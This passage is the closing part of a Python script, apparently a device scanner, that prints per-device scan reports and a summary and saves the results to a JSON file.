            print(f"  ✗ {dev.scan_status}: {dev.scan_error}")

        results.append(dev)
        await asyncio.sleep(3)  # rate limit between devices

    # Print reports
    for dev in results:
        if "done" in dev.scan_status:
            print_device_report(dev, verbose=args.verbose)

    print_summary(results)

    # Save JSON
    output = [asdict(d) for d in results]
    with open(args.output, "w") as f:
        json.dump(output, f, indent=2, default=str)
    print(f"\n[✓] Full report saved to {args.output}")


if __name__ == "__main__":
    asyncio.run(main())
